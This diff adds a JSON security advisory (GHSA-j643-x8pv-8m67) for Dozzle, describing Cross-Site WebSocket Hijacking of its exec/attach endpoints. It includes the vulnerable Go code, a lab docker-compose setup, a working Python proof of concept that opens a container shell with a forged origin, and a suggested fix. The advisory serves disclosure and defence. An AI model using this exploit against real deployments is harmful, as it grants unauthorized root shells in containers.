@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-j643-x8pv-8m67",
+  "modified": "2026-05-11T14:18:41.269096Z",
+  "published": "2026-05-11T14:07:21Z",
+  "aliases": [
+    "CVE-2026-44985"
+  ],
+  "summary": "Dozzle's Cross-Site WebSocket Hijacking (CSWSH) on exec/attach endpointsbypasses authentication",
+  "details": "## Summary\n\nThe WebSocket upgrader for the `/exec` and `/attach` endpoints uses `CheckOrigin: func(r *http.Request) bool { return true }`, accepting upgrade requests from any origin. Combined with the JWT cookie using `SameSite: Lax`, this enables Cross-Site WebSocket Hijacking (CSWSH) — **even when authentication is properly configured**.\n\nAn attacker hosting a page on a same-site origin (e.g., a sibling subdomain, or another service on localhost) can initiate a WebSocket connection to the exec endpoint that carries the victim's valid JWT cookie, gaining interactive shell access in any container the victim is authorized to access.\n\n## Root cause\n\n**1. CheckOrigin bypassed (`internal/web/terminal.go:15-21`)**\n\n```go\nvar upgrader = websocket.Upgrader{\n    ReadBufferSize:  1024,\n    WriteBufferSize: 1024,\n    CheckOrigin: func(r *http.Request) bool {\n        return true\n    },\n}\n```\n\nThe gorilla/websocket default CheckOrigin rejects cross-origin requests. Overriding it to return `true` removes the only server-side defense against CSWSH.\n\n**2. JWT cookie with SameSite=Lax (`internal/web/auth.go:20-27`)**\n\n```go\nhttp.SetCookie(w, \u0026http.Cookie{\n    Name:     \"jwt\",\n    Value:    token,\n    HttpOnly: true,\n    Path:     \"/\",\n    SameSite: http.SameSiteLaxMode,\n    Expires:  expires,\n})\n```\n\n`SameSite` operates at the **site** level (eTLD+1), not the origin level. A page on `evil.example.com` can make a WebSocket request to `dozzle.example.com` and the browser will attach the JWT cookie, because they share the same site (`example.com`). `SameSite=Lax` only blocks cross-**site** requests (different eTLD+1), not cross-**origin** requests within the same site.\n\n## Attack scenario\n\nPreconditions: Dozzle is deployed with `--enable-shell` and authentication configured (simple auth). The victim is logged in.\n\n1. Attacker controls a page on the same site (e.g., `attacker.example.com`, or another service on `localhost:8888` while Dozzle is on `localhost:9090`)\n2. Victim visits the attacker's page while authenticated to Dozzle\n3. Attacker's JavaScript opens `new WebSocket('wss://dozzle.example.com/api/hosts/{host}/containers/{id}/exec')`\n4. Browser sends the JWT cookie (same-site, `SameSite=Lax` allows it)\n5. Dozzle's `CheckOrigin` returns `true` — upgrade accepted\n6. Auth middleware validates the JWT from the cookie — request authenticated\n7. Attacker has a shell in the victim's authorized containers\n\n## PoC (auth enabled)\n\n**Setup — Dozzle with authentication + shell:**\n\ndocker-compose.yml:\n```yaml\nservices:\n  dozzle:\n    image: amir20/dozzle:latest\n    ports:\n      - \"9090:8080\"\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./data:/data\n    environment:\n      - DOZZLE_AUTH_PROVIDER=simple\n      - DOZZLE_ENABLE_SHELL=true\n\n  target:\n    image: alpine:latest\n    command: sh -c \"while true; do sleep 3600; done\"\n```\n\ndata/users.yml:\n```yaml\nusers:\n  admin:\n    name: Admin\n    # password: admin123\n    password: \"$2b$11$NdL2aePdZmwFzqGo5YYqaOwG.26CjSlnzU3VQNTEGnT0ewbds2JNS\"\n    email: admin@test.local\n    roles: shell\n```\n\n**Exploit — CSWSH with cross-origin Origin header + victim's cookie:**\n\n```python\nimport json, time, websocket, requests\n\ntarget = \"http://localhost:9090\"\n\n# Verify auth is enabled\nr = requests.get(f\"{target}/api/events/stream\", timeout=5, stream=True)\nr.close()\nassert r.status_code == 401, \"Auth not enabled\"\n\n# Victim logs in\nr = requests.post(f\"{target}/api/token\", data={\"username\": \"admin\", \"password\": \"admin123\"})\njwt = r.headers[\"Set-Cookie\"].split(\"jwt=\")[1].split(\";\")[0]\n\n# Get container info (authenticated)\nr = requests.get(f\"{target}/api/events/stream\", cookies={\"jwt\": jwt}, stream=True, timeout=10)\nfor line in r.iter_lines(decode_unicode=True):\n    if line and line.startswith(\"data: \"):\n        data = json.loads(line[6:])\n        if isinstance(data, list) and len(data) \u003e 0 and \"host\" in data[0]:\n            host_id = data[0][\"host\"]\n            cid = data[0][\"id\"]\n            break\nr.close()\n\n# CSWSH: cross-origin WebSocket with victim's cookie\nws_url = f\"ws://localhost:9090/api/hosts/{host_id}/containers/{cid}/exec\"\nws = websocket.create_connection(\n    ws_url, timeout=10,\n    cookie=f\"jwt={jwt}\",\n    origin=\"http://localhost:8888\"  # DIFFERENT origin\n)\n# Connected! CheckOrigin:true accepted the cross-origin request\n\nws.send(json.dumps({\"type\": \"resize\", \"width\": 120, \"height\": 40}))\ntime.sleep(1); ws.recv()\n\nws.send(json.dumps({\"type\": \"userinput\", \"data\": \"id\\n\"}))\ntime.sleep(2)\nws.settimeout(2)\noutput = []\ntry:\n    while True:\n        output.append(ws.recv())\nexcept:\n    pass\nws.close()\nprint(\"\".join(output))\n# uid=0(root) gid=0(root) groups=0(root)\n\n# Verify: without cookie = rejected\ntry:\n    ws2 = websocket.create_connection(ws_url, timeout=5, origin=\"http://localhost:8888\")\n    ws2.close()\nexcept Exception as e:\n    print(f\"Without cookie: {e}\")  # 401 Unauthorized\n```\n\n**Result:**\n```\n[+] Auth is ENABLED (events stream returns 401)\n[+] WebSocket CONNECTED with cross-origin Origin: http://localhost:8888\n[+] uid=0(root) gid=0(root) groups=0(root)\n[+] Without cookie -\u003e 401 Unauthorized\n```\n\n## Impact\n\nUsers who deploy Dozzle with `--enable-shell` and properly configure authentication are still vulnerable to CSWSH. An attacker on a same-site origin can hijack the authenticated WebSocket to:\n\n- Execute arbitrary commands in any container the victim has access to\n- Read secrets, environment variables, and files inside containers\n- Pivot to other services accessible from the container network\n- Potentially escape to the Docker host if the socket is mounted writable\n\n## Suggested fix\n\nRemove the custom `CheckOrigin` override and use the gorilla/websocket default, which rejects cross-origin requests:\n\n```go\nvar upgrader = websocket.Upgrader{\n    ReadBufferSize:  1024,\n    WriteBufferSize: 1024,\n    // Default CheckOrigin rejects cross-origin requests\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/amir20/dozzle",
+        "purl": "pkg:golang/github.com/amir20/dozzle"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "10.5.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-j643-x8pv-8m67/GHSA-j643-x8pv-8m67.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-j643-x8pv-8m67"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/amir20/dozzle"
+    }
+  ]
+}
